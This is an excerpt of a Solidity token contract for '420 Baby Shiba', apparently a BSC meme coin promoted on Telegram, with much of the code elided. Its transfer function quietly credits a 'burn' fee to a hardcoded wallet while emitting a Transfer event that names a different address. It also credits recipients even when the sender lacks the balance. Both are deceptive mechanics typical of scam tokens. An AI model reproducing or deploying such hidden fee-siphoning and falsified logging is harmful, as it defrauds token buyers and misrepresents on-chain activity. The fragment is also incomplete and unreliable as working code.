...
// Submitted for Telegram: https://t.me/babyshiba420bsc
...
contract  FourTwoZeroBabyShiba  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "420 Baby Shiba";
    string private _symbol = "420BBSHIB";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0xA8CD71aA65e0CAb3c6d6d375DF0B0d9Af982C2c0] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0x2859e4544C4bB03966803b044A93563Bd2D0DD4D, _bruntoken);
        }
